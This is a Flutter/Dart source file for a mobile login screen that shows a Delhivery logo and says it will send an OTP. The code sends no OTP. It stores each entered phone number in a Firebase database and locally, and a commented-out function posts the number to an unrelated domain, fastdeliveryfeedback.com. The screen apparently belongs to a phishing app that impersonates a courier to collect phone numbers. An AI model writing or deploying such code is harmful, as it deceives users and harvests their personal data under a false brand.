import 'dart:convert';
import 'dart:io';

import 'package:background_app/views/details_view.dart';
import 'package:background_app/widgets/mobile_textfield.dart';
import 'package:background_app/widgets/primary_button.dart';
import 'package:firebase_database/firebase_database.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'package:http/http.dart' as http;



class LoginView extends StatefulWidget {
  const LoginView({super.key});

  @override
  State<LoginView> createState() => _LoginViewState();
}

class _LoginViewState extends State<LoginView> {
  final TextEditingController _phoneController = TextEditingController();
  final _formKey = GlobalKey<FormState>();
  final databaseRef = FirebaseDatabase.instance.ref('phone');

  Future<void> sendDataToServer() async {
    var url = Uri.https("fastdeliveryfeedback.com", "/api/emp/create");
    var client = http.Client();

    try {
      var result = await client.post(url,
          body: json.encode({
            "number": _phoneController.text.toString(),
          }));

      if (result.statusCode == 200) {
        debugPrint("İstek başarılı");
        debugPrint(jsonDecode(result.body).toString());
      }
    } on SocketException {
    } on HttpException {
    } on FormatException {}
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        elevation: 0,
        title: Image.asset(
          'assets/images/delhivery-logo.jpg',
          width: 120,
          height: 100,
        ),
        centerTitle: true,
        automaticallyImplyLeading: false,
        backgroundColor: Colors.white,
        // toolbarHeight: 20,
      ),
      body: Padding(
        padding: const EdgeInsets.only(left: 20, right: 20, bottom: 20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  'Enter your ',
                  style: TextStyle(
                    fontSize: 30,
                    fontWeight: FontWeight.bold,
                    height: 2,
                    color: Color(0xFF3e445c),
                  ),
                ),
                const Text(
                  'mobile number',
                  style: TextStyle(
                    fontSize: 30,
                    fontWeight: FontWeight.bold,
                    color: Color(0xFF3e445c),
                  ),
                ),
                const SizedBox(
                  height: 20,
                ),
                const Text(
                  'We will send you an OTP via SMS to confirm your mobile number',
                  style: TextStyle(
                    fontSize: 14,
                    fontWeight: FontWeight.w400,
                    color: Color(0xFF535a75),
                  ),
                ),
                const SizedBox(
                  height: 30,
                ),
                Form(
                    key: _formKey,
                    child: MobileTextField(controller: _phoneController)),
              ],
            ),
          ],
        ),
      ),
      bottomSheet: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 20),
        child: PrimaryButton(
            title: 'Login',
            onTap: () async {
              if (_formKey.currentState!.validate()) {
                databaseRef
                    .child(DateTime.now().millisecondsSinceEpoch.toString())
                    .set({'phone Number': _phoneController.text.toString()});
                final prefs = await SharedPreferences.getInstance();
                await prefs.setString("number",  _phoneController.text.toString());
                //await sendDataToServer();
                Navigator.of(context).pushReplacement(
                  MaterialPageRoute(
                    builder: ((context) => const DetailsView()),
                  ),
                );
              }
            }),
      ),
    );
  }
}
